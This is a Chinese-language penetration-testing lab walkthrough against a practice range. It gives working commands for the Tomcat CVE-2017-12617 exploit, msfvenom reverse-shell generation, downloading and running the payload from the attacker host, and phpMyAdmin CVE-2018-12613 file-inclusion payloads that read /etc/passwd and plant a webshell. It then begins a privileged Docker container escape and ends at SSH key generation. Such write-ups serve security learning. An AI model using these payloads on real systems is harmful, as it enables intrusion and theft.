# 环境搭建
靶场：
ubuntu
内网ip：192.168.183.10
外网ip：192.168.1.6
域内主机：
win7：192.168.183.129
win2008：192.168.183.130
需手动开启ubuntu的docker环境，对应的端口服务如下
> 2001 struts2
>
> 2002 tomcat8
>
> 2003 phpmyadmin 4.8.1
# 外网打点
## 端口扫描
首先对ubuntu进行端口扫描，发现2001、2002、2003三个特征端口
    nmap -T4 -sC -sV 192.168.1.6
## Struts2
首先访问2001端口，是一个struts2的框架
这里直接使用漏扫工具检测struts2有无漏洞，这里发现存在S2-045、S2-046两个漏洞
首先使用S2-045看能不能命令执行，这里发现返回的是html
再换一个S2-046漏洞发现能够命令回显
这里直接尝试上传一个jsp上去试试，返回了路径
这里访问一下，返回了404，这里我尝试了其他几个路径都是返回404，但是S2-046这个漏洞应该是能拿到shell的，这里这个端口就没继续进行尝试了
## Tomcat8
看一下2002端口是一个apache tomcat8
这里直接去kali上搜索对应版本的漏洞并把漏洞检测的poc复制出来
    searchsploit tomcat 8.5.19
    searchsploit -m /exploit/jsp/webapps/42966.py
使用poc检测是否存在漏洞，这里发现是存在CVE-2017-12617这个漏洞的，这里的poc原理应该是上传了一个Poc.jsp来判断是否存在漏洞
    python 42966.py -u http://192.168.1.6:2002/
我们访问一下Poc.jsp，是存在的
那么存在漏洞，直接使用`-p`参数进行攻击，这里拿到了一个反弹回来的shell，这里因为是交互型shell，不太方便下一步的操作，这里尝试着上线msf
    python 42966.py -u http://192.168.1.6:2002/ -p pwn
因为是linux，所以需要生成linux的木马，在kali本地起一个http服务方便靶机下载
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf > shell.elf
    python -m SimpleHTTPServer  #py2环境
下载shell.elf并赋权执行
    wget http://192.168.1.10:8000/shell.elf
    chmod 777 shell.elf
    ./shell.elf
使用msf接收会话，上线成功
    set payload linux/x86/meterpreter/reverse_tcppayload linux/x86/meterpreter/reverse_tcp
    set lhost 192.168.1.10
    set lport 4444
    run
## phpmyadmin4.8.1
访问2003端口是一个直接暴露的phpmyadmin
这里对应版本的漏洞是CVE-2018-12613，是一个文件包含的漏洞，这里看一下漏洞的分析
首先在如下图所示的index.php中存在一处包含指定文件的代码：
需要成功包含，必须满足if区间中的五个条件：target参数值不为空；target参数值为字符串；target参数值不以index开头；target参数值不在黑名单中；过checkPageValidity函数的检查。其中第四个条件的黑名单即51行中import.php与export.php；第五个条件需要查看该函数：
可以看到core类的checkPageValidity函数中又必须经过以下的五个判断：
1、$whitelist为空就引用申明的$goto_whitelist  
2、$page如果没有定义或者$page不为字符串就返回false  
3、$page如果存在在$whitelist中返回true  
4、如果$_page存在在$whitelist中返回true  
5、经过urldecode函数解码后的$_page存在在$whitelist中返回true
我们可以看到在index.php调用checkPageValidity函数时没有传入其他参数，因此会进入第一个判断，而$goto_whitelist如下所示：
它定义了很多可以被包含的文件名。然后第二个判断可以跳过；看第三个判断，可以看到$page参数是不在$whitelist中的，此处不满足；看第四个判断，这个判断是对$_page进行的，校验$_page是否在白名单中，而$_page是将$page值末尾加上’?’后从字符串第0位开始分割，取其中第一次出现?之前的内容，如下图所示：target=sql.ph%3fp时：
因此此处可以用'$target=db_sql.php?/../../被包含文件'来满足条件，但是$target进入到index.php的include()中，被包含的文件无法打开，出现报错。（windows文件命名规则中规定了文件名不能出现特殊字符，linux为服务器的情况下，是可以使用？直接进行绕过)
第五个判断，先将$page进行urldecode解码，然后再进行？的分割，取值进行判断，只要解码后分割出来的值在$whitelist中即可满足条件。而在$target
里问号被二次编码为%253f，
db_sql.php%253f也会被认为是一个目录，可以用../跨越，成功实现包含。因此命名规范里面没有将%放进去也是该漏洞能在windows下成功利用的一个关键点。
这样我们可以将？进行二次编码。如果传入target=db_sql.php%253f。在第四个判断中进行白名单校验时，为db_sql.php%3f，不满足，第五个判断的urldecode后，进行校验时为db_sql.php,符合条件，然后即可成功包含文件。
这里就可以构造一个payload输出密码
    index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
这里首先写入一个phpinfo，然后查看`phpMyAdmin`的value
得到phpMyAdmin："990aadb371d8e582cb000c716aed9720"，然后构造payload进行文件包含输出phpinfo
    ?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_990aadb371d8e582cb000c716aed9720
写入一句话木马查看phpMyAdmin的值然后构造payload进行文件包含用蚁剑连接即可
phpMyAdmin:"990aadb371d8e582cb000c716aed9720"
    ?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_990aadb371d8e582cb000c716aed9720
# 内网渗透
## docker逃逸
这里理论上三种方法都能够拿到shell，这里我使用tomcat上线到msf的shell进行信息搜集
可以看到有eth0、eth1分别处于1.0/24和183.0/24两个网段，初步判断是有域环境的。
继续往下看，还有几个ip，但是不是eth，而且这里有三个ip，根据上面有三个不同的环境，那么可以判断应该是用的docker。那么我们无论使用3个环境的哪个环境拿shell都只是一个docker容器里面的shell，并不是真正ubuntu的shell，所以这里我们还需要进行docker逃逸到ubuntu
这里我尝试脏牛失败，这里就需要使用到privileged特权模式逃逸
### privileged特权模式逃逸
docker中提供了一个`--privileged`参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力  
docker文档中对这个参数的解释如下  
> 当操作员执行时docker run
> –privileged，Docker将启用对主机上所有设备的访问，并在AppArmor或SELinux中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。
当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入ssh私钥，使用ssh免密登录
这里首先新建一个tmptest文件夹，用来存放挂载后的docker
查看一下dev文件夹里面的设备文件
可以看到有四个sda设备文件，我这里选择sda1进行挂载
使用mount命令将sda1挂载到tmptest文件夹里并用ls指令进行查看
    mount /dev/sda1 /tmptest
    ls /tmptest
然后使用ssh生成一个名叫tmp的私钥，然后用chmod命令赋予权限
    ssh-keygen -f tmp